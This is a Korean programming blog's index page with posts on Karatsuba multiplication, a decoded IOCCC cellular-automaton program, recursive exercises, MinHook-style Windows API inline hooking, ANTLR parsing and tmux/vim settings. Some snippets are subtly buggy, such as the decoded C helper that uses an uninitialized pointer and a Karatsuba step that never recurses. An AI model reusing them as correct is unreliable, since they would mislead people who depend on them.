
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>KC's blog</title>
  <meta name="author" content="KC">

  
  <meta name="description" content="Karger&rsquo;s Algorithm
">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://zomo.heroku.com/posts/20/">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="KC's blog" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">KC's blog</a></h1>
  
    <h2>A blogging framework for hackers.</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="sitesearch" value="zomo.heroku.com">
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div class="blog-index">
  
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2013/08/29/kargers-algorithm/">Karger's Algorithm</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2013-08-29T12:39:00+09:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>29</span><span class='date-suffix'>th</span>, <span class='date-year'>2013</span></span> <span class='time'>12:39 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><h3>Karger&rsquo;s Algorithm</h3>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2013/08/28/karatsuba-algorithm/">Karatsuba Algorithm</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2013-08-28T02:19:00+09:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>28</span><span class='date-suffix'>th</span>, <span class='date-year'>2013</span></span> <span class='time'>2:19 am</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><h3>Karatsuba Algorithm</h3>

<p>Karatsuba 가 23 살때 발명한 알고리즘.</p>

<pre><code>def kara(x,y):
    n = len(str(x))
    n2 = pow(10,n/2)
    a = x / n2
    b = x % n2
    c = y / n2
    d = y % n2
    ans = pow(10,n)*a*c + pow(10,n/2)*(a*d+b*c) + b*d

    return ans

if __name__ == "__main__":
    x = 4586
    y = 1234
    ans = kara(x,y)
    print "%d == %d" % (ans, x*y)
</code></pre>

<p>여기서 n-digit 숫자간의 곱셈을 n/2-digit 숫자간의 곱셈으로 divide 할 수 있다.
recursive 하게 적용하면, n-digit by n-digit 을 곱하는 일반적인 곱셈의 복잡도 Theta(N<sup>2</sup>)
를 Theta(N^\log_2 3) 으로 낮출 수 있다.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2013/08/22/elementary-cellular-automata/">Elementary Cellular Automata</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2013-08-22T00:34:00+09:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>22</span><span class='date-suffix'>nd</span>, <span class='date-year'>2013</span></span> <span class='time'>12:34 am</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p><a href="http://mathworld.wolfram.com/ElementaryCellularAutomaton.html">Elementary Cellular Automaton</a> 를 1 라인으로 구현한 코드.</p>

<p><a href="http://www.ioccc.org/2012/konno/konno.c">Best one liner: konno.c</a></p>

<p>konno.c</p>

<pre><code>int _;main(O,l,o)char**l,**o;{_++&gt;&gt;9||main(1&amp;(o?(int)o:O)|O*2,l,
putchar(_%32?atoi(1[l])&gt;&gt;(7&amp;O&lt;&lt;!o&gt;&gt;!o+29)&amp;32&lt;_|_==16?35:32:10)%10);}
</code></pre>

<p>이것을 해독해보았다.</p>

<pre><code>int pos=0;

void p_b(int x)
{
    int b[33];
    char *p;
    int i;
    unsigned int j;

    memset(b,0,33);
    for(i=32, j=(1L&lt;&lt;31); i&gt;0; i--,j&gt;&gt;=1)
        *p++=(x&amp;j) ==j ? '1':'0';
    return b;
}

main(evolution_seq,argv,prev_cell)
int evolution_seq;
char **argv;
int prev_cell;
{
    /* recurse from pos=1 to pos=512 */
    if (pos++ &lt; 32*16) {
        int cell_color;

        /* Fill the 1st line with seed value */
        if (pos == 16)
            cell_color = '#';       /* The 1st line: the mid pos is '#' */
        else if (pos &lt; 32)
            cell_color = ' ';       /* The 1st line: fill with ' ' except the mid pos */
        else if (pos % 32 == 0)
            cell_color = '\n';      /* Print newline for every 32nd pos */
        else {
            int rule;

            /* 
            * Get the hight-order 3 bits of evolution sequence
            * (clears MSB if the previous cell was new-line)
            * and shift rule bits by it.
            */
            if (prev_cell == '\n')
                rule = atoi(argv[1]) &gt;&gt; (evolution_seq &lt;&lt; 1 &gt;&gt; 30 &amp; 0x7);  
            else
                rule = atoi(argv[1]) &gt;&gt; (evolution_seq &gt;&gt; 29 &amp; 0x7);

            if (rule &amp; 0x1)
                cell_color = '#'; /* black */
            else
                cell_color = ' '; /* white */
        }        
        putchar(cell_color);

        if (prev_cell == '#') { 
            evolution_seq = evolution_seq * 2 + 1;
        } else 
            evolution_seq = evolution_seq * 2; 

        main(evolution_seq, argv, cell_color);
    }
}

~% gcc k.c -o k
~% ./k 126
               #               
              ###              
             ## ##             
            #######            
           ##     ##           
          ####   ####          
         ##  ## ##  ##         
        ###############        
       ##             ##       
      ####           ####      
     ##  ##         ##  ##     
    ########       ########    
   ##      ##     ##      ##   
  ####    ####   ####    ####  
 ##  ##  ##  ## ##  ##  ##  ## 
###############################
</code></pre>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2013/08/20/recursive-things/">Recursive Things</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2013-08-20T12:15:00+09:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>20</span><span class='date-suffix'>th</span>, <span class='date-year'>2013</span></span> <span class='time'>12:15 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>&ldquo;알고리즘 문제 해결 전략&rdquo; 이라는 책을 읽고 있다. algospot.com 의 운영자가 쓴 책이다.</p>

<h3>Combination</h3>

<p>1 ~ 9 사이의 숫자를 4 개 뽑는 combination 구하기.</p>

<pre><code>def pick(selection, last):
    if len(selection) == 4:
        print selection
        return
    for i in range(last+1,9):
        selection.append(i)
        pick(selection, i)
        selection.remove(i)

if __name__ == "__main__":
    selection = []
    pick(selection, 0)
</code></pre>

<h3>음식 대접</h3>

<p>음식을 가리는 4 명의 사람들에게 6 가지의 메뉴 중, 최소한의 메뉴를 준비해서 대접하는 문제.</p>

<pre><code>answer = []

def OK(menu):
    bit = 0
    if 1 in menu:
        bit = bit | 0b1100
    if 2 in menu:
        bit = bit | 0b1001
    if 3 in menu:
        bit = bit | 0b0101
    if 4 in menu:
        bit = bit | 0b0001
    if 5 in menu:
        bit = bit | 0b0110
    if 6 in menu:
        bit = bit | 0b1010

    if bit == 0b1111:
        return True
    else:
        return False

def Explore(menu, depth):
    if depth == 7:
        if OK(menu):
            answer.append( (len(menu), list(menu)) )
            return len(menu)
        else:
            return 987654321
    menu.append(depth)
    size = Explore(menu, depth + 1)
    menu.pop()
    size2 = Explore(menu, depth + 1)
    if size &lt; size2:
        return size
    else:
        return size2

if __name__ == "__main__":
    menu = []
    min = Explore(menu,1)
    for (x,y) in answer:
        if x == min:
            print y
</code></pre>

<h3>구간 max</h3>

<p>Recursive algorithm 은 아니지만.</p>

<p>{ 5, -2, 4, -18, 8, 10, -7, 5, 8, 4, 3, -7, -2, 5, 8, -28, 9, 10, -12, 13, 5 } 라는 어레이에서 summation_from_i_to_j 가 가장 큰 index i, j 를 찾는 문제. 무식하지 않게 하는 것이 포인트.</p>

<p>우선 O(N<sup>2</sup>) 으로 하는 방법은 간단하다.</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

main()
{
    int a[] = { 5, -2, 4, -18, 8, 10, -7, 5, 8, 4, 3, -7, -2, 5, 8, 0, 9, 10, -28, 13, 5 };
    int N = sizeof a / sizeof (int);

    int i,j;
    int max = 1 &lt;&lt; (sizeof(int) * 8 - 1);
    int sum;
    int _i,_j;

    for (i = 0; i &lt; N; i++) {
        sum = 0;
        for (j = i; j &lt; N; j++) {
            sum += a[j];
            if (sum &gt; max) {
                max = sum;
                _i = i;
                _j = j;
            }
        }
    }
    printf("sum(%d, %d) = %d\n", _i, _j, max);
}
</code></pre>

<p>O(N) 알고리즘.</p>

<ol>
<li>과거를 잊고 새로 summation 을 시작해야 할지를 계속 결정해야 한다.</li>
<li>과거가 minus 라면 싹 잊고 새로 시작하는 것이 낫다.</li>
<li>과거가 그래도 plus 라면 구간합을 올리는데 도움은 된다.</li>
<li>음수인 구간합은 의미가 없다. 0 이 낫다.</li>
<li>i 까지의 최대구간합은 maxAt(i) = max( 0, maxAt(i-1) ) + a[i]</li>
</ol>


<p>등을 가지고 만들어본다.</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

#define MAX(a,b) (a &gt; b ? a : b)
sum2() 
{
    int a[] = { 5, -2, 4, -18, 8, 10, -7, 5, 8, 4, 3, -7, -2, 5, 8, 0, 9, 10, -28, 13, 5 };
    int N = sizeof a / sizeof (int);
    int partial_sum = 0;
    int max = 1 &lt;&lt; (sizeof(int) * 8 - 1);
    int i;

    for (i = 0; i &lt; N; ++i) {
        partial_sum = MAX(partial_sum, 0) + a[i];
        max = MAX(partial_sum, max);
    }
    printf("max %d\n", max);
    return max;
}
</code></pre>

<p>여기서 구간을 알아내도록 고쳐보면,</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int _start = 0;
int _end = 0;

sum2() 
{
    int a[] = { 5, -2, 4, -18, 8, 10, -7, 5, 8, 4, 3, -7, -2, 5, 8, 0, 9, 10, -28, 13, 5 };
    int N = sizeof a / sizeof (int);
    int partial_sum = 0;
    int max = 1 &lt;&lt; (sizeof(int) * 8 - 1);
    int i;

    for (i = 0; i &lt; N; ++i) {
        if (partial_sum &lt; 0) {
            partial_sum = a[i];
            _start = i;
        } else
            partial_sum = partial_sum + a[i];

        if (partial_sum &gt; max) {
            max = partial_sum;
            _end = i;
        } 
    }
    return max;
}
main(){printf("sum(%d-%d) = %d\n",_start,_end,sum2());}
</code></pre>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2013/08/20/windows-api-hooking/">Windows API Hooking</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2013-08-20T09:37:00+09:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>20</span><span class='date-suffix'>th</span>, <span class='date-year'>2013</span></span> <span class='time'>9:37 am</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>몇 가지 Windows API Hooking 라이브러리를 테스트 해보기로 했다.</p>

<p>Microsoft 의 Detours. x86 버전만 free 이고, x64 버전은 돈을 받는다. 탈락.</p>

<p><a href="http://www.codeproject.com/Articles/44326/MinHook-The-Minimalistic-x86-x64-API-Hooking-Libra">MinHook - The Minimalistic x86/x64 API Hooking Library</a> 을 발견.</p>

<p>읽고 정리해본다.</p>

<p>Inline hooking 을 하는 듯 하다.</p>

<p>Target funciton 의 진입 부분을 JMP 로 overwrite 한다.</p>

<p>x86 모드에서는 Target function 이 0x4000 0000 부근에 있다고 가정하면,
5 bytes 를 차지하는 32bit relative JMP 로 커버 가능하다.</p>

<pre><code>0x4000 0000: E9 FB FF FF BF           JMP 0x0
0x4000 0000: E9 FA FF FF BF           JMP 0xFFFFFFFF 
</code></pre>

<p>Target funciton (i.e. USER32.dll!MessageBoxW) 의 진입부분을 JMP 로 overwrite 하고,
Detour 로 뛰었다가, 다시 원래 코드로 돌아가야 한다.</p>

<p>이 부분을 Trampoline Function 이라고 부르는데, &ldquo;원래 함수의 앞부분을 클론한 것&rdquo; +
&ldquo;JMP to 원래 함수&rdquo; 로 이루어져 있다.</p>

<pre><code>; Original
0x770E 11E4: 48 83 EC 38              SUB RSP, 0x38
0x770E 11E8: 45 33 DB                 XOR R11D, R11D
; Trampoline
0x7706 4BD0: 48 83 EC 38              SUB RSP, 0x38
0x7706 4BD4: 45 33 DB                 XOR R11D, R11D
0x7706 4BD7: FF 25 5B E8 FE FF        JMP QWORD NEAR [0x77053438]
0x7705 3438: EB 11 0E 77 00 00 00 00
</code></pre>

<p>Visual Studio 2013 으로 빌드해서 테스트해보니 잘 동작한다.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2013/06/23/antlr-and-language-implementation-patterns/">ANTLR &amp; Language Implementation Patterns</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2013-06-23T11:26:00+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>23</span><span class='date-suffix'>rd</span>, <span class='date-year'>2013</span></span> <span class='time'>11:26 am</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>ANTLR 의 개발자 T.P. 가 Pragmatic 에서 책을 두 권 출판했다.</p>

<p>처음 예제는 List Parser 를 만드는 것.</p>

<p>리스트라 함은.</p>

<p>[ a,b,c] 나 [a, [x,y,z], b, c]</p>

<p>같은 것들.</p>

<h3>Token</h3>

<p>Token 을 보관하는 데이터 구조.</p>

<p>Type 과 Text 로 이루어져있고,</p>

<p>Type 으로는</p>

<pre><code>T_EOF
T_NAME
T_COMMA
T_LBRACK
T_RBRACK
</code></pre>

<p>등이 있다.</p>

<p>Text 에는 &ldquo;<EOF>&rdquo;, &ldquo;NAME&rdquo;, &ldquo;COMMA&rdquo;, &ldquo;LBRACK&rdquo;, &ldquo;RBRACK&rdquo; 등이.</p>

<p>Token class 의 method 로는,</p>

<p>new_token / print_token 정도.</p>

<h3>LL(1) Parser</h3>

<p>기본적인 사상은,</p>

<p>lookahead 오퍼레이션과 consume 을 분리하는 것.</p>

<p>LL(1) Parser 에서는 말장난같지만, LL(k) Parser 로 가면 개념이 명료해짐.</p>

<p>기본적인 함수는 nextToken() - 버퍼를 tokenize 하는 함수.</p>

<p>whitespace 는 consume 해버린다.</p>

<p>&lsquo;,&rsquo;, &lsquo;[&rsquo;, &lsquo;]&rsquo; 을 만나면, consume 하고, 새로운 토큰을</p>

<pre><code>new_token(T_LBRACK, "[") 
new_token(T_RBRACK, "]") 
new_token(T_COMMA, ",") 
</code></pre>

<p>등으로 만들어 리턴.</p>

<p>Character buffer 를 tokenizing 해서 token stream 으로 변환.</p>

<h3>LL(k) Parser</h3>

<p>LL(k) Parser 는 lookahead 를 몇 개 앞의 토큰까지 보고 판단하느냐가 핵심.</p>

<p>1 개의 lookahead 만 가지고 파싱을 진행할 수 있는 문법이 있는가하면,</p>

<p>불가능한 문법도 있기 때문에, LL(k) Parser 가 필요.</p>

<p>LL(1) 에서는 lookahead 토큰 하나만 가지고 했다면, LL(4) 에서는 4 개의 lookahead 토큰을 가지고 파싱 작업을 수행하게 된다.</p>

<p>LIST 를 그래머로 기술하면,</p>

<pre><code>list : '[' elements ']' ;
elements : element (',' element)* ;
element : NAME | list

[ a, b, c ] 
[ a, [ x, y, z ], b ] 
</code></pre>

<p>등을 기술할 수 있다.</p>

<p>위의 그래머는 다음 코드로 변환된다.</p>

<pre><code>list() { match(T_LBRACK); elements(); match(T_RBRACK); }
elements() { element(); if (lookahead.type == T_COMMA) { match(T_COMMA); elements(); } }
element() { 
  if (lookahead.type == T_NAME) match(T_NAME);
  else if (lookahead.type == T_LBRACK) list();
  else throw new Error("unexpeced: " + lookahead.type);
}
</code></pre>

<p>결국 해보니, 위의 그래머는 lookahead 하나만 가지고 구현 가능하다. LL(1).</p>

<p>그럼 LL(2) 파서가 필요한 그래머를 만들어본다.</p>

<pre><code>list : '[' elements ']' ;
elements : element (',' element)* ;
element : NAME '=' NAME | NAME | list ;
</code></pre>

<p><code>NAME = NAME</code> 과 <code>NAME</code> 이 동일한 <code>NAME</code> 으로 시작하기때문에, one lookahead 만으로는
파싱이 불가능하다. two lookaheads 를 유지하도록 한다.</p>

<p>Circular Lookahead Buffer 를 만들어 관리.</p>

<p>[a,b,c] 를 LL(4) 에서 예제.</p>

<pre><code>lookahead[0] '[' &lt;-- bp
lookahead[1] 'a'
lookahead[2] ','
lookahead[3] 'b'
</code></pre>

<p>가 초기 상태. 4 개의 lookahead 를 가지게 된다.</p>

<p>초기 lookahead 버퍼를 셋업하는 방법은,</p>

<pre><code>lookahead[bp] = lexer.getToken();
bp = (bp+1) % k;
</code></pre>

<p>를 k 번 만큼하면, <code>lookahead[0]</code> ~  <code>lookahead[k-1]</code> 까지의 버퍼가 토큰으로 채워지고, bp 는 0 으로 돌아와서, 처음을 가리키게 된다.
버퍼도 채우고, 맨 처음도 가리키고.</p>

<p>consume 을 한번 하면.</p>

<pre><code>lookahead[0] ','
lookahead[1] 'a' &lt;-- bp
lookahead[2] ','
lookahead[3] 'b'
</code></pre>

<p>첫 &lsquo;[&rsquo; 는 discard 되고, base pointer 가 전진했으며, 4 개의 lookahead 를 maintain 하기 위해, 새로운 &lsquo;,&rsquo; 가 들어왔다.</p>

<pre><code>lookahead = new Token[4];
for (i=0;i&lt;4;i++) lookahead[i] = lexer.nextToken();
bp = 0;
</code></pre>

<p>하면 초기 CLB 셋업이 끝난다.</p>

<pre><code>consume() { lookahead[bp] = lexer.nextToken(); bp = (bp + 1) % 4; }
</code></pre>

<p>를 하면 자연스럽게 가장 오래된 것을 버리고, 새로운 토큰을 맨 뒤에 넣고, base pointer 는 circular buffer 의 처음을 가리키게 된다.</p>

<pre><code>LT(i) { return lookahead[bp + i - 1]; }
</code></pre>

<p>하면 1 번째, 2 번째 등등의 lookahead 를 할 수 있게 된다.</p>

<pre><code>"To visualize parsing decisions, imagine a maze with a single entrance and a
single exit that has words written on the floor. Every sequence of words along
a path from entrance to exit represents a sentence. The structure of the maze
is analogous to the rules in a grammar that define a language. To test a sentence
for membership in a language, we compare the sentence's words with
the words along the floor as we traverse the maze. If we can get to the exit by
following the sentence's words, that sentence is valid."
</code></pre>

<h3>JSON Grammar</h3>

<p>예제삼아 JSON 을 ANTLR 그래머로 기술해본다.</p>

<pre><code>object
    : '{' pair (',' pair)* '}'
    | '{' '}'
    ;

array
    : '[' value (',' value)* ']'
    | '[' ']'
    ;

value
    : STRING
    | NUMBER
    | object
    | array
    | 'true'
    | 'false'
    | 'null'
    ;
</code></pre>

<h3>Building AST</h3>

<p>ANTLR 를 사용하지 않고, 손으로 AST 를 만들어보았다.</p>

<p>AST 는 Homogeneous AST / Normalized Heterogeneous AST / Irregular Heterogeneous AST 정도로
나눌 수 있는데, 간단한 Homogeneous AST 를 만들어 보았다.</p>

<p>Recursive 하게 decent 하는 파서의 특성을 활용하면, <code>AST.addChild(parent, int astType, Token token)</code>
정도의 콜을 적절히 달아주는 것으로 트리 빌딩이 가능하다.</p>

<pre><code>public class AST {
    Token token;
    List&lt;AST&gt; children;
    public AST(Token token) { this.token = token; }
    public void addChild(AST t) { 
        if (children == null) children = new ArrayList&lt;AST&gt;();
        children.add(t);
    }
}
</code></pre>

<p>일단 하나의 클래스로 모든 노드를 담는다.
하나의 타입만 있으니까, children 을 <code>List&lt;AST&gt; children</code> 으로 관리할 수 있다.
AST 를 만들기 위해, 3 lookaheads 를 사용하였다.</p>

<pre><code>$ java Test '[1,x=2,[3,4]]'
match LBRACK
match NAME
match COMMA
match NAME
match EQUALS
match NAME
match COMMA
match LBRACK
match NAME
match COMMA
match NAME
match RBRACK
match RBRACK
AST Type: AST_ROOT
    AST Type: AST_LIST
        AST Type: AST_NAME
            Token: NAME : 1
        AST Type: AST_ASSIGN
            AST Type: AST_IDENTIFIER
                Token: NAME : x
            AST Type: AST_VALUE
                Token: NAME : 2
        AST Type: AST_LIST
            AST Type: AST_NAME
                Token: NAME : 3
            AST Type: AST_NAME
                Token: NAME : 4
</code></pre>

<h3>Building AST with ANTLR</h3>

<p>벡터 계산에 관한 문법을 만들고, ANTLR 를 가지고 AST 를 build 한다.</p>

<pre><code>x = 1+2
y = 1*2+3
z = [1,2] + [3,4]
a = [1,2] . [3,4]
b = 3 * [1,2]
print x+2

statline : stat+ ;
stat: ID '=' expr | 'print' expr ;
expr: multExpr ('+' multExpr)* ; // E.g., "3*4 + 9"
multExpr: primary (('*'|'.') primary)* ;
primary : INT | ID | '[' expr (',' expr)* ']'
</code></pre>

<p>우선 <code>output=AST;</code> 로 AST 를 빌드 모드로.</p>

<pre><code>grammar VecMathAST;
options {output=AST;}
tokens {VEC;}
</code></pre>

<p>그리고 기존 문법에 AST rewrite 를 위한 규칙을 추가한다. 예를 들어</p>

<pre><code>statlist : stat+ ;
stat: ID '=' expr
</code></pre>

<p>같은 경우 <code>stat: ID '=' expr</code> 에 AST rewrite 규칙을 추가한다.</p>

<pre><code>statlist : stat+ ;
stat: ID '=' expr -&gt; ^('=' ID expr)
</code></pre>

<p><code>^('=' ID expr)</code> 은, <code>'='</code> 가 subtree 의 root 고, <code>ID</code>, <code>expr</code> 가 children 으로,
AST 를 구성하라는 rewriting rule 이 된다.</p>

<p>Antlr 의 AST rewriting 을 이해하기 위해 참조한 블로그는 <a href="http://bkiers.blogspot.kr/2011/03/5-building-ast.html">Bart&rsquo;s Blog</a> 임.</p>

<pre><code>bar : A B C D -&gt; ^(B A C) ;
</code></pre>

<p>을 하면, B 가 root 가 되고, A, C 가 children 이 되고, D 는 없어진다.</p>

<p>다른 예.</p>

<pre><code>addExpr : multiplyExpr (('+' | '-') multiplyExpr)* ;

addExpr : multiplyExpr (('+' | '-')^ multiplyExpr)* ;
</code></pre>

<p>을 하면, &lsquo;+&rsquo;, &lsquo;-&rsquo; 가 root 가 되고 multiplyExpr 2 개가 children 이 된다.</p>

<p>root 로 할만한 적당한 녀석이 없을 경우에는 하나 만들면 된다.</p>

<pre><code>block : (statement | funcitonDecl)* (Return expression ';')? ;

block : 
    (statement | functionDecl)* (Return expression ';')?
        -&gt; ^(BLOCK ^(STATEMENTS statement*) ^(RETURN expression?))
    ;
</code></pre>

<p>을 하면, 모든 block 은 STATEMENTS, RETURN 이라는 2 개의 children 을 가지게 된다.</p>

<p>본격적으로 AST rewriting rule 을 추가하면,</p>

<pre><code>// START: header
grammar VecMathAST;
options {output=AST;} // we want to create ASTs
tokens {VEC;} // define imaginary token for vector literal
// END: header

// START: stat
statlist : stat+ ;                    // builds list of stat trees
stat: ID '=' expr  -&gt; ^('=' ID expr)  // '=' is operator subtree root
    | 'print' expr -&gt; ^('print' expr) // 'print' is subtree root
    ;
// END: stat

// START: expr
expr:   multExpr ('+'^ multExpr)* ;        // '+' is root node
multExpr: primary (('*'^|'.'^) primary)* ; // '*', '.' are roots
primary
    :   INT   // automatically create AST node from INT's text
    |   ID    // automatically create AST node from ID's text
    |   '[' expr (',' expr)* ']' -&gt; ^(VEC expr+)
    ;
// END: expr

ID  :   'a'..'z'+ ;
INT :   '0'..'9'+ ;
WS  :   (' '|'\r'|'\n')+ {skip();} ;
</code></pre>

<h3>Parse Tree</h3>

<p>AST 와 Parse Tree 의 차이점이 <a href="http://stackoverflow.com/questions/5026517/whats-the-difference-between-parse-tree-and-ast">What&rsquo;s the difference between parse tree and AST?</a> 에 정리되어 있다.</p>

<pre><code>The AST only contains all 'useful' elements that will be used for further processing,
while the parse tree contains all the artifacts (spaces, brackets, ...)
from the original document you parse
</code></pre>

<h3>Backtracking Parser &amp; Memoizing Parser</h3>

<p>LL(k) 파서로 판단하기 어려운 모호성이 존재할 때, 쓰는 기법.</p>

<pre><code>The easiest way to implement a backtracking strategy for a parsing
decision is to speculatively attempt the alternatives in order until we
find one that matches. Upon success, the parser rewinds the input and 
parses the alternative normally. Upon failing to match an alternative,
the parser rewinds the input and tries the next one. If the parser can't 
find any matching alternative, it throws a "no viable alternative" 
exception.
</code></pre>

<p>다음과 같은 문법을 보자. Python 과 같이 <code>[a,b] = [c,d]</code> 와 같은 리스트 어사인을 지원하는 문법이다.</p>

<pre><code>stat    : list EOF | assign EOF ;
assign  : list '=' list ;
list    : '[' elements ']' ;
elements    : element (',' element)* ;
element     : NAME '=' NAME | NAME | list
</code></pre>

<p>stat 의 경우, list 인지 assign 인지 정하기 위해서는 리스트를 파싱하고 나서, 토큰 하나를 더 봐야
알 수 있다.</p>

<p>얼터너티브를 시도해보면서, 경우에 따라 백트래킹하는 코드.</p>

<pre><code>public void statement() throws RecognitionException {
    if ( speculate_stat_alt1() ) { list(); match(Lexer.EOF_TYPE); }
    else if ( speculate_stat_alt2() ) { assign(); match(Lexer.EOF_TYPE); }
    else throw new NoViableAltException("expecting stat found " + LT(1));
}

public boolean speculate_stat_al1() {
    boolean success = true;
    mark();
    try { list(); match(Lexer.EOF_TYPE); }
    catch (RecognitionException e) { success = false; }
    release();
    return success;
}
public boolean speculate_stat_al2() {
    boolean success = true;
    mark();
    try { assign(); match(Lexer.EOF_TYPE); }
    catch (RecognitionException e) { success = false; }
    release();
    return success;
}
</code></pre>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2013/06/12/tmux-pane-setting/">Tmux Pane Setting</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2013-06-12T20:02:00+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>12</span><span class='date-suffix'>th</span>, <span class='date-year'>2013</span></span> <span class='time'>8:02 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>tmux 와 vimrc 에 몇가지를 추가했는데.</p>

<h3>tmux</h3>

<p>pane 을 vi key 로 옮겨다니기 위해서</p>

<pre>
unbind j
unbind k
unbind h
unbind l
bind j select-pane -D
bind k select-pane -U
bind h select-pane -L
bind l select-pane -R
</pre>


<p>를 해서 자판에서 손을 안떼고 움직일 수 있게 하였다.</p>

<p>그리고,</p>

<pre>
bind / command-prompt "split-window 'exec %%'"
</pre>


<p>를 추가해서 간단한 shell command 를 tmux 안에서 날릴 수 있게 하였다.</p>

<p>C-a / 를 누르고 ping localhost 를 때리면, pane 이 하나 열리고 ping 이 실행된다.</p>

<pre><code>bind a send-prefix
</code></pre>

<p>로 Ctrl-a a 로 Ctrl-a 기능을 살린다. Ctrl-a / Ctrl-e / Ctrl-b 등의 Emacs 스타일 cursor moving 을 자주 쓴다면 필요.</p>

<p>그리고 tmux 가 최근에 1.8 로 업글되었다.
Ubuntu 의 경우 패키지로 아직 repo 에 안올라와서, source 를 컴파일해야 한다.
OS X 의 경우 brew 에 1.8 패키지가 올라왔다. <code>brew install tmux</code> 또는 <code>brew upgrade tmux</code> 하면 된다.
1.8 의 큰 장점은 pane zoom 이 된다는 것. 그 전까지는 꽁수로 했었는데, 이제는 native 하게 된다.
<code>Ctrl-a z</code> 로 zoom 을 토글할 수 있다. 줌기능 대박이다.</p>

<p>Ubuntu 에서 tmux 카피 버퍼와 OS 클립보드를 통합하는 방법:</p>

<pre><code>$ sudo apt-get install xclip

bind C-c run "tmux save-buffer - |xclip -i -sel clipboard"
bind C-v run "tmux set-buffer \"$(xclip -o -sel clipboard)\"; tmux paste-buffer"
</code></pre>

<p>OS X 에서 통합하는 방법:</p>

<pre><code>$ git clone https://github.com/ChrisJohnsen/tmux-MacOSX-pasteboard.git
$ cd tmux-MacOSX-pasteboard
$ make reattach-to-user-namespace
$ mv reattach-to-user-namespace /usr/local/bin
$ export PATH="/usr/local/bin:$PATH"

set -g default-command "reattach-to-user-namespace -l /bin/zsh"
bind C-c run "tmux save-buffer - | reattach-to-user-namespace pbcopy"
bind C-v run "tmux set-buffer $(reattach-to-user-namespace pbpaste); tmux paste-buffer"
</code></pre>

<p>이제 C-a C-c 로 tmux buffer -> OS X clipboard 로 카피할 수 있다.</p>

<h3>vim</h3>

<p>만약 Solarized 를 안쓴다면, TabLine 을 바꾸는 것이 좋다.</p>

<p>.vimrc 에</p>

<pre>
hi TabLineSel ctermfg=Red ctermbg=Yellow
hi TabLine ctermfg=Blue ctermbg=Yellow
hi TabLineFill ctermfg=LightGreen ctermbg=DarkGreen
</pre>


<p>ftplugin 으로 안하고, 그냥 .vimrc 에 때려박은 것들이 있는데,</p>

<pre><code>autocmd FileType python set sts=4|set sw=4|set expandtab
autocmd FileType ruby set sts=2|set sw=2|set expandtab
</code></pre>

<p>나중에 filetype plugin 으로 정리할 생각.</p>

<p>사람들이 잘 모르는 것이 sts 와 ts 와 sw 의 차이.</p>

